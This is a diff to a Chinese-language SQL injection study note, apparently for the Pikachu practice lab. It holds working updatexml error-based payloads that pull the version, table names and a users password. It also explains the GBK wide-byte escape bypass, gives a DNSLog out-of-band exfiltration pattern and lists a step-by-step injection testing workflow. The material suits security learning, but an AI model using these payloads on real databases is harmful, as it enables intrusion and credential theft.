@@ -194,23 +194,27 @@ k' and updatexml(1,(concat(0x7e,(select password from users limit 0,1),0x7e)),1)
 
 3.数字型注入不加引号
 
-```shell
-'or updatexml(1,(concat('>>',(select version()),'<<')),1) or'
+```text
+'or updatexml(1,(concat(0x7e,(select version()),0x7e)),1) or'
+
+'or updatexml(1,(concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu' limit 0,1),0x7e)),1) or'
 ```
 
 
 
 ## 宽字节注入
 
-服务端在把提交数据进行SQL语句拼接前对数据进行了转义。在数据中的单引号等特殊符号前面加了“\”来进行转义
-
-单引号变成普通符号，失效了
+服务端在把提交数据进行SQL语句拼接前对数据进行了转义。在数据中的单引号等特殊符号前面加`\`把特殊符号转义为普通文本
 
 ![宽字节注入2](images/宽字节注入2.png)
 
-如果服务端使用的是GBK编码，通过在提交数据中的单引号`0x27`前面加`0xDF`的方法。
+如果服务端使用的是GBK编码，可以通过在提交数据中的单引号`0x27`前面加`0xDF`的方法绕过。
 
-服务端转义机制识别到单引号`0x27`之后再它前面加反斜杠`0x5C`,此时字节流变成`0xDF` `0x5C` `0X27`
+
+
+### 原理
+
+既然服务端识别到单引号`0x27`之后在它前面加反斜杠`0x5C`,那么在上传数据时提前在`0x27`前面加一个`0xDF`。服务端在他们中间加斜杠`0x5C`后，字节流变成`0xDF` `0x5C` `0X27`
 
 服务端使用**GBK 字符集**处理这段字节流，会按双字节规则解析：
 
@@ -390,6 +394,23 @@ select load_file(concat('//',(指定SQL语句),'.指定通信网站'))
 ```
 
 ![DNSlog带出日志](images/DNSlog带出日志.png)
+
+
+
+## Sql注入测试流程
+
+1. 真假 `and 1=1/1=2` 测有无注入
+2. **有回显 → union 联合注入**
+3. **无回显→ 报错注入（增删改通用）**
+4. **无报错无回显 → 布尔盲注 → 时间盲注**
+5. 盲注太慢 → **DNSLog 注入**
+6. 字符过滤 / 编码问题 → 宽字节、堆叠、二次、偏移注入
+
+
+
+
+
+
 
 
 
